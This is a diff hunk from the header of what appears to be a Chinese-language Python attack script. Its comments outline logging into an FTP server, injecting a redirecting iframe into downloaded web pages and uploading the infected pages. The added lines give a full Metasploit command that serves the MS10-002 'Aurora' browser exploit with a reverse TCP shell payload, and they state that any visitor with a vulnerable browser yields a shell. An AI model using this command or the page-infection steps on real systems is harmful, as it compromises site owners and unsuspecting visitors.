@@ -9,6 +9,8 @@
 #                  2.下载指定的网页
 #                  3.在网页中加入重定向的iframe字符串
 #                  4.上传被感染的网页
+# 在Kali下配合 msfcli exploit/windows/browser/ms10_002_aurora LHOST=192.168.175.128 SRVHOST=192.168.175.128 URIPATH=/exploit PAYLOAD=windows/shell/reverse_tcp LPORT=443 E
+# 只要其他主机访问了https://192.168.175.128/exploit，同时浏览器存在漏洞，即可获得目标客户端的shell权限
 # 博客 https://blog.csdn.net/l1028386804
 
 import ftplib
